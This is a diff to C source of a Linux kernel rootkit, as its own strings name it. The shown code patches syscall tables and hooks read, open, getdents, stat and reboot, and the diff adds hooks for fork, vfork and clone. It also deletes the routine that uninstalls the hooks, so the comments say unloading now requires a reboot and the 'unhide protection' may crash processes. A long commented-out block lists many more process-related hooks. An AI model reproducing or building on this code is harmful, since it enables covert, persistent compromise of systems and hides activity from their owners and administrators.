@@ -91,7 +91,6 @@ int disassemble(void *code, size_t code_len);
 int safe_zero(void *dst, size_t len);
 int clone_sct(void *dst, void *src, size_t len);
 inline void install_hooks(void);
-inline void uninstall_hooks(void);
 inline int calc_addr_offset(void);
 long rand64(void);
 int rand32(void);
@@ -241,7 +240,6 @@ inline int load(void) {
 	 * Setup hooks, and we're done.
 	 */
 	install_hooks();
-	
 	sleep(ret);
 	if (unload() == -2) {
 		perr("Sorry, error when unload().\n");
@@ -253,25 +251,13 @@ inline int load(void) {
 }
 
 inline int unload(void) {
-	pinfo("Uninstalling hooks ...\n");
-	uninstall_hooks();
-	
+	/* This only for devel, we must uninstall loader and reboot to successfully unload the rootkit */
+	// May crash some process due to the unhide protection
 	pinfo("Unpatching syscall tables refs ...\n");
 	if (unpatch_syscall_tables_refs() == -2) {
 		perr("Sorry, error while unpatching syscall tables refs. Aborting ...\n");
 		return -2;
 	}
-
-	/*
-	pinfo("Releasing cloned syscall tables ...\n");
-	release_cloned_syscall_tables();
-
-	pinfo("Releasing rkkernel ...\n");
-	release_rkkernel();
-	*/
-
-	/* Success! */
-	pinfo("RK Unload success.\n");
 
 	return -1;
 }
@@ -324,6 +310,7 @@ inline void install_hooks(void) {
 	//HOOK64(__NR_recvfrom, KADDR(my_recvfrom64));
 	//HOOK32(__NR_recvfrom, KADDR(my_recvfrom32));
 
+	/* Networking */
 	HOOK64(__NR_read, KADDR(my_read64));
 	HOOK64(__NR_reboot, KADDR(my_reboot64));
 	HOOK64(__NR_open, KADDR(my_open64));
@@ -334,21 +321,54 @@ inline void install_hooks(void) {
 	HOOK64(__NR_lstat, KADDR(my_lstat64));
 	HOOK64(__NR_newfstatat, KADDR(my_newfstatat64));
 
+	/* Process management */
+	HOOK64(__NR_fork, KADDR(my_fork64));
+	HOOK64(__NR_vfork, KADDR(my_vfork64));
+	HOOK64(__NR_clone, KADDR(my_clone64));
+	/*
+	HOOK64(__NR_wait4, KADDR(my_wait464));
+	HOOK64(__NR_kill, KADDR(my_kill64));
+        HOOK64(__NR_waitid, KADDR(my_waitid64));
+        HOOK64(__NR_getpid, KADDR(my_getpid64));
+        HOOK64(__NR_gettid, KADDR(my_gettid64));
+        HOOK64(__NR_getppid, KADDR(my_getppid64));
+        HOOK64(__NR_getpgid, KADDR(my_getpgid64));
+        HOOK64(__NR_getpgrp, KADDR(my_getpgrp64));
+        HOOK64(__NR_getsid, KADDR(my_getsid64));
+        HOOK64(__NR_setsid, KADDR(my_setsid64));
+        HOOK64(__NR_tkill, KADDR(my_tkill64));
+        HOOK64(__NR_tgkill, KADDR(my_tgkill64));
+        HOOK64(__NR_ptrace, KADDR(my_ptrace64));
+        HOOK64(__NR_rt_sigqueueinfo, KADDR(my_rt_sigqueueinfo64));
+        HOOK64(__NR_rt_tgsigqueueinfo, KADDR(my_rt_tgsigqueueinfo64));
+        HOOK64(__NR_sched_setparam, KADDR(my_sched_setparam64));
+        HOOK64(__NR_sched_getparam, KADDR(my_sched_getparam64));
+        HOOK64(__NR_sched_setscheduler, KADDR(my_sched_setscheduler64));
+        HOOK64(__NR_sched_getscheduler, KADDR(my_sched_getscheduler64));
+        HOOK64(__NR_sched_rr_get_interval, KADDR(my_sched_rr_get_interval64));
+        HOOK64(__NR_sched_setaffinity, KADDR(my_sched_setaffinity64));
+        HOOK64(__NR_sched_getaffinity, KADDR(my_sched_getaffinity64));
+        HOOK64(__NR_migrate_pages, KADDR(my_migrate_pages64));
+        HOOK64(__NR_move_pages, KADDR(my_move_pages64));
+        HOOK64(__NR_perf_event_open, KADDR(my_perf_event_open64));
+        HOOK64(__NR_prlimit64, KADDR(my_prlimit6464));
+        HOOK64(__NR_process_vm_readv, KADDR(my_process_vm_readv64));
+        HOOK64(__NR_process_vm_writev, KADDR(my_process_vm_writev64));
+        HOOK64(__NR_kcmp, KADDR(my_kcmp64));
+        HOOK64(__NR_sched_setattr, KADDR(my_sched_setattr64));
+        HOOK64(__NR_sched_getattr, KADDR(my_sched_getattr64));
+        HOOK64(__NR_get_robust_list, KADDR(my_get_robust_list64));
+        HOOK64(__NR_getpriority, KADDR(my_getpriority64));
+        HOOK64(__NR_setpriority, KADDR(my_setpriority64));
+        HOOK64(__NR_ioprio_get, KADDR(my_ioprio_get64));
+        HOOK64(__NR_ioprio_set, KADDR(my_ioprio_set64));
+        HOOK64(__NR_capget, KADDR(my_capget64));
+        HOOK64(__NR_capset, KADDR(my_capset64));
+        HOOK64(__NR_set_tid_address, KADDR(my_set_tid_address64));
+        HOOK64(__NR_seccomp, KADDR(my_seccomp64));
+        HOOK64(__NR_prctl, KADDR(my_prctl64));
+	*/
 	pinfo("Hooks installed!\n");
-}
-
-inline void uninstall_hooks(void) {
-	UNHOOK64(__NR_read);
-	UNHOOK64(__NR_reboot);
-	UNHOOK64(__NR_open);
-	UNHOOK64(__NR_openat);
-	UNHOOK64(__NR_getdents);
-	UNHOOK64(__NR_getdents64);
-	UNHOOK64(__NR_stat);
-	UNHOOK64(__NR_lstat);
-	UNHOOK64(__NR_newfstatat);
-
-	pinfo("Hooks uninstalled!\n");
 }
 
 int safe_zero(void *dst, size_t len) {
